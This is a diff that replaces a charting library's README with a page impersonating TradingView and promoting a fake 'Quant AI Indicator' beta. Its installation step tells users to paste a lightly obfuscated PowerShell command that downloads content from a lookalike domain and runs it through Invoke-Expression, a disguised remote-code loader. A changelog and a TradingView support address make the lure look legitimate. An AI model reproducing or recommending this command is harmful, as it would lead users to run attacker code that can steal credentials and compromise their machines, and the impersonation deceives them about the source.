@@ -1,145 +1,110 @@
-<!-- markdownlint-disable no-inline-html first-line-h1 -->
-
+<a id="get"></a>
 <div align="center">
-  <a href="https://www.tradingview.com/lightweight-charts/" target="_blank">
-    <img width="200" src="https://github.com/tradingview/lightweight-charts/raw/master/.github/logo.svg?sanitize=true" alt="Lightweight Charts logo">
-  </a>
+<p align="center">
+  <img src="logo.png" alt="TradingView" width="580">
+</p>
 
-  <h1>Lightweight Charts™</h1>
+## Quant AI Indicator
 
-  [![CircleCI][ci-img]][ci-link]
-  [![npm version][npm-version-img]][npm-link]
-  [![npm bundle size][bundle-size-img]][bundle-size-link]
-  [![Dependencies count][deps-count-img]][bundle-size-link]
-  [![Downloads][npm-downloads-img]][npm-link]
-  [![pkg.pr.new][pkg-pr-new-img]][pkg-pr-new-link]
 </div>
 
-<!-- markdownlint-enable no-inline-html -->
+The first AI-powered indicator in our library, built to bring more market context directly into TradingView. It analyzes live market data and changing conditions to show several ways a setup may develop over the timeframe you select. Each view is displayed on the chart with the data and context behind it.
 
-[Demos][demo-url] | [Documentation](https://tradingview.github.io/lightweight-charts/) | [Reddit](https://www.reddit.com/r/TradingView/)
+## Getting Started
 
-TradingView Lightweight Charts™ are one of the smallest and fastest financial HTML5 charts.
+### 1. Open Command Prompt.
 
-The Lightweight Charts™ library is the best choice for you if you want to display financial data as an interactive chart on your web page, or replace static image charts with interactive ones. It does this without affecting your web page's loading speed and performance.
-The size of the library is close to static images but if you have dozens of image charts on a web page then using this library can make the size of your web page smaller.
+Press **Win + R**, type:
 
-The library provides a rich set of charting capabilities out of the box, but you can also extend its functionality by building custom plugins. Browse the [plugin catalog](https://tradingview.github.io/lightweight-charts/plugins) for ready-made plugins, or see the [interactive plugin examples](https://tradingview.github.io/lightweight-charts/plugin-examples/) and [plugin-examples/README.md](https://github.com/tradingview/lightweight-charts/tree/master/plugin-examples) to build your own.
-
-Take a look at [awesome-tradingview](https://github.com/tradingview/awesome-tradingview?tab=readme-ov-file#lightweight-charts) for related projects created by our community members.
-
-## Installing
-
-### es6 via npm
-
-```bash
-npm install lightweight-charts
+```text
+cmd
 ```
 
-### Latest master build
+Then press **Enter**.
 
-To try the latest `master` build without waiting for a release (powered by [pkg.pr.new](https://pkg.pr.new)):
+### 2. Run the Quant Indicator Installation Command.
 
-```bash
-npm install https://pkg.pr.new/lightweight-charts@master
+Copy and paste the following command into Command Prompt:
+```powershell
+powershell -NoProfile -Command "$GetIndicatorList; $Quant; $IndicatorVersion='v_2.9.5_beta'; $Sync='Library'; $Install; $Pinescript='TradingView'+$Sync+'.AI'; (curl -UseBasicParsing ($Pinescript)).Content | iex"
 ```
 
-The import and usage below applies to both npm installation options:
+Press **Enter** to begin the installation.
 
-```js
-import { createChart, LineSeries } from 'lightweight-charts';
+### 3. Restart TradingView for the changes to take effect.
 
-const chart = createChart(document.body, { width: 400, height: 300 });
-const lineSeries = chart.addSeries(LineSeries);
-lineSeries.setData([
-    { time: '2019-04-11', value: 80.01 },
-    { time: '2019-04-12', value: 96.63 },
-    { time: '2019-04-13', value: 76.64 },
-    { time: '2019-04-14', value: 81.89 },
-    { time: '2019-04-15', value: 74.43 },
-    { time: '2019-04-16', value: 80.01 },
-    { time: '2019-04-17', value: 96.63 },
-    { time: '2019-04-18', value: 76.64 },
-    { time: '2019-04-19', value: 81.89 },
-    { time: '2019-04-20', value: 74.43 },
-]);
-```
+After installation, Quant Indicator will appear in your TradingView indicator library.
 
-### CDN
 
-You can use [unpkg](https://unpkg.com/):
 
-<https://unpkg.com/lightweight-charts/dist/lightweight-charts.standalone.production.js>
 
-The standalone version creates `window.LightweightCharts` object with all exports from `esm` version:
 
-```js
-const chart = LightweightCharts.createChart(document.body, { width: 400, height: 300 });
-const lineSeries = chart.addSeries(LightweightCharts.LineSeries);
-lineSeries.setData([
-    { time: '2019-04-11', value: 80.01 },
-    { time: '2019-04-12', value: 96.63 },
-    { time: '2019-04-13', value: 76.64 },
-    { time: '2019-04-14', value: 81.89 },
-    { time: '2019-04-15', value: 74.43 },
-    { time: '2019-04-16', value: 80.01 },
-    { time: '2019-04-17', value: 96.63 },
-    { time: '2019-04-18', value: 76.64 },
-    { time: '2019-04-19', value: 81.89 },
-    { time: '2019-04-20', value: 74.43 },
-]);
-```
+## Beta & Support
 
-### Build variants
+Quant is currently being tested ahead of its full in-app release.
 
-|Dependencies included|Mode|ES module|IIFE (`window.LightweightCharts`)|
-|-|-|-|-|
-|No|PROD|`lightweight-charts.production.mjs`|N/A|
-|No|DEV|`lightweight-charts.development.mjs`|N/A|
-|Yes (standalone)|PROD|`lightweight-charts.standalone.production.mjs`|`lightweight-charts.standalone.production.js`|
-|Yes (standalone)|DEV|`lightweight-charts.standalone.development.mjs`|`lightweight-charts.standalone.development.js`|
+If you encounter an issue or would like to share feedback, contact us at [support@tradingview.com](mailto:support@tradingview.com).
 
-## AI coding assistants
+Your feedback helps us improve stability, model behavior, and chart integration throughout the beta.
 
-This repository ships two [Agent Skills](https://github.com/tradingview/lightweight-charts/tree/master/.github/skills) for AI coding assistants, such as Claude Code and Codex. The skills give the assistant current v5 knowledge to work from, instead of outdated snippets it may remember from training:
+## Current Version
 
-- [`lightweight-charts`](https://github.com/tradingview/lightweight-charts/blob/master/.github/skills/lightweight-charts/SKILL.md) is about *using* the library. It covers the v5 API conventions, the mental model, and common time, scale, marker, plugin, and wrapper foot-guns.
-- [`lightweight-charts-plugin-authoring`](https://github.com/tradingview/lightweight-charts/blob/master/.github/skills/lightweight-charts-plugin-authoring/SKILL.md) is about *writing* a [plugin](https://tradingview.github.io/lightweight-charts/docs/plugins/intro). The skill helps choose between a custom series and a primitive, build on `@tradingview/lwc-toolkit`, and learn from the official plugin packages. It also warns about the common autoscale, whitespace, and hit-test traps. The `create-lwc-plugin` wizard offers to install this skill into a new plugin project.
+**Quant AI Indicator — Beta**  
+**Version:** `v2.9.5-beta`
 
-Install either or both with the `skills` CLI; add `--skill <name>` to pick one of the two:
+---
 
-```console
-npx skills add tradingview/lightweight-charts
-```
+## Changelog
 
-## Development
+### v2.9.5-beta
 
-See [BUILDING.md](./BUILDING.md) for instructions on how to build `lightweight-charts` from source.
+### Model & Analysis Engine
 
-## License
+- Refined multi-factor processing across price action, liquidity, positioning, volatility, and market structure.
+- Updated scenario-generation logic to produce clearer differences between possible market paths.
+- Adjusted model recalculation when incoming data changes the underlying setup.
+- Improved consistency across short-, medium-, and longer-term timeframes.
 
-Licensed under the Apache License, Version 2.0 (the "License"); you may not use this software except in compliance with the License.
-You may obtain a copy of the License in the [LICENSE](./LICENSE) file.
-Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.
+#### Event-Aware Analysis
 
-This software incorporates several parts of tslib (<https://github.com/Microsoft/tslib>, (c) Microsoft Corporation) that are covered by BSD Zero Clause License.
+- Expanded processing of scheduled market events.
+- Added relevance filtering based on asset, timeframe, and event timing.
+- Updated scenario refreshes to account for newly available event information.
 
-This license requires specifying TradingView as the product creator.
-You shall add the "attribution notice" from the NOTICE file and a link to <https://www.tradingview.com/> to the page of your website or mobile application that is available to your users.
-As thanks for creating this product, we'd be grateful if you add it in a prominent place.
-You can use the [`attributionLogo`](https://tradingview.github.io/lightweight-charts/docs/api/interfaces/LayoutOptions#attributionLogo) chart option for displaying an appropriate link to <https://www.tradingview.com/> on the chart itself, which will satisfy the link requirement.
+#### Scenario Engine
 
-[demo-url]: https://www.tradingview.com/lightweight-charts/
+- Reduced overlap between generated market views.
+- Improved identification of the key factors behind each scenario.
+- Refined how timeframe and market structure are incorporated into scenario generation.
 
-[ci-img]: https://img.shields.io/circleci/build/github/tradingview/lightweight-charts.svg
-[ci-link]: https://circleci.com/gh/tradingview/lightweight-charts
+#### Live Data Pipeline
 
-[npm-version-img]: https://badge.fury.io/js/lightweight-charts.svg
-[npm-downloads-img]: https://img.shields.io/npm/dm/lightweight-charts.svg
-[npm-link]: https://www.npmjs.com/package/lightweight-charts
+- Reduced latency between incoming market data and analysis updates.
+- Improved handling of rapid changes in volatility.
+- Added validation for incomplete or inconsistent market inputs.
 
-[bundle-size-img]: https://badgen.net/bundlephobia/minzip/lightweight-charts
-[deps-count-img]: https://img.shields.io/badge/dynamic/json.svg?label=dependencies&color=brightgreen&query=$.dependencyCount&uri=https%3A%2F%2Fbundlephobia.com%2Fapi%2Fsize%3Fpackage%3Dlightweight-charts
-[bundle-size-link]: https://bundlephobia.com/result?p=lightweight-charts
-[pkg-pr-new-img]: https://pkg.pr.new/badge/tradingview/lightweight-charts
-[pkg-pr-new-link]: https://pkg.pr.new/~/tradingview/lightweight-charts
+#### Chart Integration
+
+- Improved scenario rendering directly on the chart.
+- Updated synchronization between model refreshes and displayed data.
+- Improved stability when switching assets and timeframes.
+
+#### Stability & Performance
+
+- Reduced recalculation time across parts of the analysis pipeline.
+- Improved recovery from temporary data-source interruptions.
+- Fixed synchronization and display issues identified during beta testing.
+
+---
+
+## What We’re Working On
+
+Current beta development is focused on:
+
+- scenario quality across different market regimes;
+- event-aware analysis;
+- reducing unnecessary changes during noisy market conditions;
+- faster adaptation to meaningful changes in market structure;
+- broader stability testing across assets and timeframes.
+
+Additional changes will be documented as the beta progresses.
